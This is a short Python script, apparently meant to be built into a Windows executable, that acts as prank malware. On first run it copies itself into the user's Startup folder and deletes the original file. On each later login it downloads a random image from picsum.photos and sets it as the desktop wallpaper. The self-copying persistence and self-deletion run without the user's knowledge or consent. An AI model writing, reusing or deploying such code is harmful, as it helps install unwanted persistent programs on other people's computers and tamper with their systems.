# import modules
import os
import requests
import ctypes
import shutil
import sys

#define variables
user_home = os.path.expanduser('~')
startfolder = os.path.join(user_home, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
script_file = os.path.basename(sys.executable)
startup_script_path = os.path.join(startfolder, script_file)

#func to copy exe to startup
def copy_to_startup():
    if not os.path.exists(startup_script_path):
        shutil.copy2(sys.executable, startfolder)
      
#Changes the wallpaper to a random image from picsum.com
def wallpaper():
    SPI_SETDESKWALLPAPER = 0x0014
    SPIF_UPDATEINIFILE = 0x01
    SPIF_SENDCHANGE = 0x02
    image_url = 'https://picsum.photos/1920/1080'
    response = requests.get(image_url)
    image_data = response.content
    local_path = os.path.join(startfolder, 'wallpaper.png')
    with open(local_path, 'wb') as f:
        f.write(image_data)
    result = ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, local_path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)
    return result

#if script is ran first time, it will copy itself to startup
if not os.path.realpath(sys.executable) == startup_script_path:
    copy_to_startup()
    os.remove(os.path.realpath(sys.executable))
#if script is already in startup, change wallpaper  
elif os.path.realpath(sys.executable) == startup_script_path:
    wallpaper()
